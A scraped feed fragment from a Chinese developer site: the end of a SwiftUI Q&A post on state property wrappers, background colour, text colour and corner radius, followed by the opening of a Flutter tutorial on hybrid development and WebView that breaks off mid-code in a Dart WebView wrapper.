p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">@State, @StateObject, @Published</h2>
<h3 data-id="heading-1">@State</h3>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> SwiftUI

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">CounterView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> count <span class="hljs-operator">=</span> <span class="hljs-number">0</span>

    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span>(spacing: <span class="hljs-number">20</span>) {
            <span class="hljs-type">Text</span>(<span class="hljs-string">"点了 (count) 次"</span>)   <span class="hljs-comment">// 2. 读值</span>
            <span class="hljs-type">Button</span>(<span class="hljs-string">"+1"</span>) {
                count <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>           <span class="hljs-comment">// 3. 改值 → 自动刷新界面</span>
            }
        }
        .font(.largeTitle)
    }
}
</code></pre>
<p><code>@State</code> 是 SwiftUI 里最常用的属性包装器之一。</p>
<p><strong>注意事项</strong></p>
<ul>
<li>只能用于 <strong>当前 View 内部</strong> 的私有可变状态。</li>
<li>当 <code>@State</code> 的值改变时，SwiftUI 会 <strong>自动重新计算 body</strong>，把最新数据画到屏幕上。</li>
</ul>
<h3 data-id="heading-2">@StateObject</h3>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> SwiftUI
<span class="hljs-keyword">import</span> Combine

<span class="hljs-comment">// 1. 先写一个可观察的模型</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TimerModel</span>: <span class="hljs-title class_">ObservableObject</span> {
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> seconds <span class="hljs-operator">=</span> <span class="hljs-number">0</span>        <span class="hljs-comment">// 2. 发布变化</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> cancellable: <span class="hljs-type">AnyCancellable</span>?
    
    <span class="hljs-keyword">init</span>() {
        cancellable <span class="hljs-operator">=</span> <span class="hljs-type">Timer</span>.publish(every: <span class="hljs-number">1</span>, on: .main, in: .common)
            .autoconnect()
            .sink { <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span>
                <span class="hljs-keyword">self</span>.seconds <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>
            }
    }
}

<span class="hljs-comment">// 3. 视图里“创建并持有”这个模型</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">TimerView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@StateObject</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> model <span class="hljs-operator">=</span> <span class="hljs-type">TimerModel</span>()   <span class="hljs-comment">// ← 关键：@StateObject</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Text</span>(<span class="hljs-string">"(model.seconds) 秒"</span>)
            .font(.largeTitle)
    }
}
</code></pre>
<p><code>@StateObject</code> 也是属性包装器，专门用来 <strong>创建并持有</strong> 一个 <code>ObservableObject</code> 实例。</p>
<p><strong>注意事项</strong></p>
<ul>
<li>对象里的 <code>@Published</code> 属性一旦变化，<strong>所有用到它的视图自动刷新</strong>。</li>
<li><strong>只有第一次初始化时才会真正创建</strong>；后面 SwiftUI 重绘视图时不会反复 new 出新对象。</li>
</ul>
<h3 data-id="heading-3">@Published</h3>
<p><code>@Published</code> 不是给 View 用的属性包装器，而是 <strong>写在 ObservableObject 里的“广播器”</strong>。<strong>只要这个属性值一变，立刻通知所有正在监听它的视图</strong>。</p>
<p><strong>注意事项</strong></p>
<ul>
<li>只能用在 <strong>ObservableObject 协议</strong> 的类里。</li>
<li>标记为 <code>@Published</code> 的属性，SwiftUI 会自动生成 <code>objectWillChange</code> 发布事件。</li>
<li>视图那一端用 <code>@StateObject</code> 或 <code>@ObservedObject</code> 拿到这个对象后，就能 <strong>实时响应</strong> 这些变化。</li>
</ul>
<h3 data-id="heading-4">Q&amp;A</h3>
<p><strong>Q：@State 只能用在集成了 View 的struct或者class 中？</strong></p>
<p>A：<code>@State</code> 只能出现在 <strong>SwiftUI 的 View 结构体（或极少数自己实现 <code>View</code> 协议的类）里</strong>，而且必须是 <strong>当前视图私有的可变状态</strong>。</p>
<p><strong>Q：@state只能修饰一些基础类型，无法修饰复杂的引用类型等</strong></p>
<p>A：<code>@State</code> <strong>完全可以修饰“复杂”的引用类型</strong>（class、嵌套 struct、数组、字典、自定义模型……），只要它满足两点：</p>
<ul>
<li>类型遵守 <code>Equatable</code>（SwiftUI 靠它 diff，官方文档推荐，不遵守也能跑，但可能多刷）。</li>
<li>你在 View 里 <strong>把整个实例换掉</strong>（值语义）——SwiftUI 只关心“旧值 vs 新值”有没有变化，不关心内部字段。</li>
</ul>
<p><strong>Q：就是说比如我定义了一个 @State var person = Person(name: "Xiaomi") ，然后当我更换引用对象比如，person = Person(name:"Sam")也会触发界面的刷新？</strong></p>
<p>A：没错，<strong>会刷新</strong>——前提是你把“整颗对象”换掉</p>
<p><strong>Q：那么如果我想让类的成员可视化到界面上，并实时显示最新的值，那么我就得遵守 ObservableObject 协议 ，并且使用 @Published 修饰对应的成员？</strong></p>
<p>A：是的，想让“类的某个成员”一变化就自动刷新界面，<strong>必须</strong>同时满足：</p>
<ul>
<li>类遵守 <code>ObservableObject</code> 协议；</li>
<li>那个成员用 <code>@Published</code> 修饰；</li>
<li>视图通过 <code>@StateObject</code>（或 <code>@ObservedObject</code>）持有这个类实例。</li>
</ul>
<h3 data-id="heading-5">避坑小贴士</h3>
<ol>
<li><strong>不要</strong>在 <code>init</code> 里直接修改 <code>@State</code> / <code>@StateObject</code> 包装的值，SwiftUI 会忽略这次写入。</li>
<li><strong>不要</strong>把 <code>@StateObject</code> 用在“不是真正拥有者”的视图里，否则可能出现“同一模型被重复创建”或“野指针”问题；子视图只观察时用 <code>@ObservedObject</code>。</li>
<li><strong>不要</strong>在 <code>ObservableObject</code> 里手动调用 <code>objectWillChange.send()</code>，除非你有特殊时机需求；<code>@Published</code> 已经帮你做了。</li>
<li><strong>不要</strong>把值类型（struct）也加上 <code>@Published</code>，它照样工作，但会失去“共享引用”的意义，容易陷入“改了副本、界面没反应”的错觉。</li>
</ol>
<h2 data-id="heading-6">界面背景色</h2>
<h3 data-id="heading-7">Q&amp;A</h3>
<p><strong>Q：最新的swift ui语法中，如何设置界面的背景色，并且忽略安全边界？ <code>Color.blue.ignoreSageAre()</code> 这么写是不是不是最佳开发实践了？</strong></p>
<p>A: 你写的 <code>ignoreSageAre()</code> 拼写错了，应该是<br/>
<code>.ignoresSafeArea()</code>（iOS 14+ 的名字，以前叫 <code>.edgesIgnoringSafeArea(.all)</code>）。</p>
<p>另外，<strong>直接把 <code>Color.blue</code> 当根视图</strong> 虽然能跑，但属于“偷懒写法”——<br/>
一旦后面要加别的控件，就得再包 <code>ZStack</code>，不如一开始就写成“背景层 + 内容层”分离的形式，可读性、可维护性都更好。</p>
<p>推荐写法（iOS 14+ 官方风格）：</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ContentView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">ZStack</span> {
            <span class="hljs-type">Color</span>.blue                <span class="hljs-comment">// 1. 背景层</span>
                .ignoresSafeArea()    <span class="hljs-comment">// 2. 忽略安全边界</span>
            
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Hello, SwiftUI"</span>)    <span class="hljs-comment">// 3. 内容层</span>
                .foregroundColor(.white)
        }
    }
}
</code></pre>
<p><strong>Q：我记得还可以直接 ZStack{..}.background(.blue).ignore啥的，是不是也可以？</strong></p>
<p>A：可以，但顺序得换一下：<br/>
<code>background</code> 只是给 <code>ZStack</code> 刷一层颜色，<strong>本身不会自动撑满屏幕</strong>，所以要把 <code>.ignoresSafeArea()</code> 贴在真正“能撑满”的那个视图（也就是 <code>Color.blue</code>）上，而不是贴在 <code>ZStack</code> 后面。</p>
<pre><code class="hljs language-scss" lang="scss">ZStack {
    Text("Hello, SwiftUI")<span class="hljs-selector-class">.foregroundColor</span>(.white)
}
<span class="hljs-selector-class">.background</span>(.blue.ignoresSafeArea())   <span class="hljs-comment">// iOS 15+ 语法糖</span>
</code></pre>
<p><strong>Q：和Color.blue.ignoresSafeArea() 这种方式比，那种方式更好一些？</strong></p>
<p>A：两种写法在最终视觉效果上几乎一样：整屏蓝底、无视安全区。差异主要在<strong>可读性、扩展性、习惯</strong>上，而不是性能。</p>
<p><code>Color.blue.ignoresSafeArea()</code> 是最佳实践。</p>
<p>两种写法在最终视觉效果上几乎一样：整屏蓝底、无视安全区。<br/>
差异主要在<strong>可读性、扩展性、习惯</strong>上，而不是性能。</p>
<ul>
<li>快速原型、单页极简界面：用 <code>.background(Color.blue.ignoresSafeArea())</code> 完全没问题。</li>
<li>正式项目、多人协作、后续会迭代：优先 <strong>ZStack 里单独放 <code>Color</code> 层</strong>，扩展、阅读都更舒服。</li>
</ul>
<h2 data-id="heading-8">字体颜色</h2>
<h3 data-id="heading-9">Q&amp;A</h3>
<p><strong>Q：最新的swift ui 中 .fontColor 好像已经不推荐了？</strong></p>
<p>A：在 SwiftUI 里并没有 <code>.fontColor</code> 这个修饰器，从 iOS 13 开始官方就统一用<br/>
<code>.foregroundColor(_:)</code> 或 iOS 15 起更通用的 <code>.foregroundStyle(_:)</code> 来给 Text、Image、Shape 等设置“前景色”。</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-type">Text</span>(<span class="hljs-string">"Hello"</span>)
    .foregroundColor(.red)      <span class="hljs-comment">// iOS 13+ 专用颜色</span>
<span class="hljs-comment">// 或者</span>
<span class="hljs-type">Text</span>(<span class="hljs-string">"Hello"</span>)
    .foregroundStyle(.red)      <span class="hljs-comment">// iOS 15+ 接受任何 ShapeStyle（纯色、渐变、材质）</span>
</code></pre>
<h2 data-id="heading-10">圆角</h2>
<h3 data-id="heading-11">Q&amp;A</h3>
<p><strong>Q：Text("CLICK HERE") .foregroundStyle(.white) .padding() .background(.black).cornerRadius(8) 这么设置圆角好像也不推荐了在新的swiftui中</strong></p>
<p>A：<code>cornerRadius(8)</code> 并没有被废弃，代码现在依旧能编译、能跑；<br/>
但在 iOS 17 的 Apple Sample 和 WWDC 视频里，官方更推荐用 <strong><code>.clipShape(.rect(cornerRadius: 8))</code></strong> （或者 <code>.clipShape(RoundedRectangle(cornerRadius: 8))</code>）来裁切，语义更清晰——“先画完再裁”，而不是“把边框圆角当成修饰器”。</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 1. 老写法（依旧可用）</span>
<span class="hljs-type">Text</span>(<span class="hljs-string">"CLICK HERE"</span>)
    .foregroundStyle(.white)
    .padding()
    .background(.black)
    .cornerRadius(<span class="hljs-number">8</span>)

<span class="hljs-comment">// 2. iOS 17 推荐写法</span>
<span class="hljs-type">Text</span>(<span class="hljs-string">"CLICK HERE"</span>)
    .foregroundStyle(.white)
    .padding()
    .background(.black)
    .clipShape(.rect(cornerRadius: <span class="hljs-number">8</span>))   <span class="hljs-comment">// ← 语义：把整体裁成圆角矩形</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[《Flutter全栈开发实战指南：从零到高级》- 23 -混合开发与WebView]]></title>    <link>https://juejin.cn/post/7580295137394507791</link>    <guid>https://juejin.cn/post/7580295137394507791</guid>    <pubDate>2025-12-06T08:51:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580295137394507791" data-draft-id="7580263284337475625" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="《Flutter全栈开发实战指南：从零到高级》- 23 -混合开发与WebView"/> <meta itemprop="keywords" content="Flutter,iOS,Android"/> <meta itemprop="datePublished" content="2025-12-06T08:51:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="QuantumLeap丶"/> <meta itemprop="url" content="https://juejin.cn/user/1767603104125197"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            《Flutter全栈开发实战指南：从零到高级》- 23 -混合开发与WebView
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1767603104125197/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    QuantumLeap丶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T08:51:19.000Z" title="Sat Dec 06 2025 08:51:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">混合开发为何如此重要？</h2>
<p>在实际项目中，我们常面临这样的困境：业务需要快速迭代，但原生发版周期长；H5页面体验不佳，但开发速度快。混合开发正是解决这一矛盾的<strong>最佳平衡点</strong>。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[业务需求] --&gt; B{开发方案选择}
    B --&gt; C[原生开发]
    B --&gt; D[Web开发]
    B --&gt; E[混合开发]
    
    C --&gt; F[优势: 性能最佳]
    C --&gt; G[劣势: 迭代慢, 双端开发]
    
    D --&gt; H[优势: 跨平台, 热更新]
    D --&gt; I[劣势: 体验差, 能力受限]
    
    E --&gt; J[融合两者优势]
    E --&gt; K[平衡性能与效率]
    
    J --&gt; L[原生体验 + Web灵活性]
    K --&gt; M[快速迭代 + 一致体验]
</code></pre>
<h2 data-id="heading-1">一：WebView核心原理</h2>
<h3 data-id="heading-2">1.1 WebView的本质是什么？</h3>
<p>很多人以为WebView只是一个内置浏览器，其实远不止如此。WebView实际上是一个<strong>微型浏览器</strong>，它包含了HTML解析器、CSS渲染器、JavaScript引擎等完整组件。</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph "WebView内部架构"
        A[WebView容器] --&gt; B[渲染引擎]
        A --&gt; C[JavaScript引擎]
        A --&gt; D[网络模块]
        
        B --&gt; E[HTML解析器]
        B --&gt; F[CSS渲染器]
        B --&gt; G[布局引擎]
        
        C --&gt; H[V8/JSCore引擎]
        D --&gt; I[网络请求处理]
    end
    
    subgraph "Flutter侧"
        J[Dart VM] --&gt; K[Flutter Engine]
        K --&gt; L[Skia渲染]
    end
    
    A -.-&gt; K
    C -.-&gt; J
</code></pre>
<p>WebView和Flutter运行在不同的隔离环境中：</p>
<ul>
<li>Flutter：运行在Dart VM，使用Skia渲染</li>
<li>WebView：运行在浏览器引擎中，有自己的渲染管线</li>
</ul>
<h3 data-id="heading-3">1.2 Flutter中的WebView实现原理</h3>
<p>Flutter的WebView并不是自己实现的浏览器引擎，而是对原生WebView的<strong>桥接封装</strong>：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bbbdcd490a064848b5df651dfa419289~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUXVhbnR1bUxlYXDkuLY=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765615879&amp;x-signature=%2BKYakKPNulwlfQTNJ8dHzmkfVl0%3D" alt="Untitled.png" loading="lazy"/></p>
<p><strong>Platform Channels工作原理</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// Flutter调用原生方法的流程</span>
<span class="hljs-number">1.</span> Dart代码调用WebViewController的方法
<span class="hljs-number">2.</span> 通过MethodChannel将二进制消息发送到原生端
<span class="hljs-number">3.</span> 原生端调用对应的WebView API
<span class="hljs-number">4.</span> 结果通过MethodChannel返回Dart
</code></pre>
<h2 data-id="heading-4">二：封装WebView</h2>
<h3 data-id="heading-5">2.1 基础封装</h3>
<p>先看一个在实际项目中使用的WebView封装，这个版本已经处理了大部分常见问题：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:webview_flutter/webview_flutter.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestWebView</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> url;
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">String</span>&gt;? headers;
  
  <span class="hljs-keyword">const</span> TestWebView({
    Key? key,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.url,
    <span class="hljs-keyword">this</span>.headers,
  }) : <span class="hljs-keyword">super</span>(key: key);
  
  <span class="hljs-meta">@override</span>
  _TestWebViewState createState() =&gt; _TestWebViewState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_TestWebViewState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">TestWebView</span>&gt; </span>{
  <span class="hljs-comment">// 控制器</span>
  <span class="hljs-keyword">late</span> WebViewController _controller;
  
  <span class="hljs-comment">// 状态管理</span>
  <span class="hljs-built_in">double</span> _progress = <span class="hljs-number">0.0</span>;
  <span class="hljs-built_in">bool</span> _isLoading = <span class="hljs-keyword">true</span>;
  <span class="hljs-built_in">bool</span> _hasError = <span class="hljs-keyword">false</span>;
  <span class="hljs-built_in">String?</span> _pageTitle;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    _initWebView();
  }
  
  <span class="hljs-keyword">void</span> _initWebView() {
    _controller = WebViewController()
      <span class="hljs-comment">// 1. 基础配置</span>
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setBackgroundColor(Colors.transparent)
      
      <span class="hljs-comment">// 2. 注册JavaScript通信通道</span>
      ..addJavaScriptChannel(
        <span class="hljs-string">'FlutterBridge'</span>,
        onMessageReceived: (message) {
          _handleJavaScriptMessage(message.message);
        },
      )
      
      <span class="hljs-comment">// 3. 导航</span>
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageStarted: (url) {
            setState(() {
              _progress = <span class="hljs-number">0.0</span>;
              _isLoading = <span class="hljs-keyword">true</span>;
              _hasError = <span class="hljs-keyword">false</span>;
            });
          },
          
          onProgress: (progress) {
            setState(() =&gt; _progress = progress / <span class="hljs-number">100.0</span>);
          },
          
          onPageFinished: (url) <span class="hljs-keyword">async</span> {
            <span class="hljs-comment">// 获取页面标题</span>
            <span class="hljs-keyword">final</span> title = <span class="hljs-keyword">await</span> _controller.getTitle();
            setState(() {
              _pageTitle = title;
              _isLoading = <span class="hljs-keyword">false</span>;
            });
            
            <span class="hljs-comment">// 注入自定义脚本</span>
            <span class="hljs-keyword">await</span> _injectCustomScripts();
          },
          
          <span class="hljs-comment">// URL拦截</span>
          onNavigationRequest: (request) {
            <span class="hljs-keyword">return</span> _handleNavigation(request);
          },
        ),
      )
      
      <span class="hljs-comment">// 4. 加载页面</span>
      ..loadRequest(
        <span class="hljs-built_in">Uri</span>.parse(widget.url),
        headers: widget.headers ?? {},
      );
  }
  
  <span class="hljs-comment">// 处理JS消息</span>
  <span class="hljs-keyword">void</span> _handleJavaScriptMessage(<span class="hljs-built_in">String</span> message) {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">final</span> data = jsonDecode(message);
      <span class="hljs-keyword">final</span> type = data[<span class="hljs-string">'type'</span>];
      <span class="hljs-keyword">final</span> payload = data[<span class="hljs-string">'data'</span>];
      
      <span class="hljs-keyword">switch</span> (type) {
        <span class="hljs-keyword">case</span> <span class="hljs-string">'userAction'</span>:
          _handleUserAction(payload);
          <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> <span class="hljs-string">'getUserInfo'</span>:
          _sendUserInfoToWeb();
          <span class="hljs-keyword">break</span>;
      }
    } <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'JS消息解析失败: <span class="hljs-subst">$e</span>'</span>);
    }
  }
  
  <span class="hljs-comment">// URL导航处理逻辑</span>
  NavigationDecision _handleNavigation(NavigationRequest request) {
    <span class="hljs-keyword">final</span> url = request.url;
    
    <span class="hljs-comment">// 白名单</span>
    <span class="hljs-keyword">if</span> (!_isUrlInWhitelist(url)) {
      <span class="hljs-keyword">return</span> NavigationDecision.prevent;
    }
    
    <span class="hljs-comment">// 链接处理</span>
    <span class="hljs-keyword">if</span> (url.startsWith(<span class="hljs-string">'myapp://'</span>)) {
      _handleDeepLink(url);
      <span class="hljs-keyword">return</span> NavigationDecision.prevent;
    }
    
